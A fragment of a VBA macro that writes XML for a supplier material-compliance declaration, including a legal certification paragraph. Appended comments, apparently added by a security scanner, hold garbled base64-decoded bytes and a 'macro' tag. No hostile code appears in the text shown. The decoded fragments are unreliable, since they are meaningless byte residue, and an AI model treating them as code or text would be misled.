    Print #handle, "        <CompanyID identity=""" & "N/A" & """ authority=""" & "N/A" & """/>"
    Print #handle, "      </RequestCompany>"
    Print #handle, "    </Request>"
    Print #handle, "    <Declaration legalType=""" & "Standard" & """ supplierAcceptance=""" & "true" & """ legalDef=""" & _
            "Our Company certifies that all information contained in this declaration is true and correct " & _
            "to the best its knowledge as of the response date of this declaration. The receiving company of this declaration " & _
            "(hereforth known as Customer) acknowledges that Our Company may  have relied on information provided by others to complete this " & _
            "declaration and Our Company may not have independently verified this information.  However, in situations where Our Company has not " & _
            "independently verified information provided by others, Our Company agrees that, at a minimum, its suppliers have provided certifications " & _
            "regarding their contributions to the part(s), and those certifications are at least as comprehensive as the certification in this " & _
            "paragraph. If Customer should enter into a written agreement with Our Company concerning the part for which this declaration was created, " & _
            "that agreement will be the sole and exclusive source of Our Company's liability and the Customer's remedies for issues that may arise " & _
            "regarding the information provided on this form." & """/>"
    Print #handle, "  </BusinessInfo>"
    Print #handle, "  <Include>"
    Print #handle, "    <Sectional name=""" & "MaterialInfo" & """>"
    Print #handle, "      <SubSectional name=""" & "D" & """/>"
    Print #handle, "    </Sectional>"
    Print #handle, "  </Include>"
    printStaticInfo = True
    Exit Function
printStaticInfoError:
    printStaticInfo = False
End Function




' InQuest injected base64 decoded content
' E*GV
' R13("/
' =AD9TA
' Y< ;5.
' *G^/CG
' _&6,34
' *GIS2
' H9TA
' Y< ;5.QZC
' ZCH6

INQUEST-PP=macro
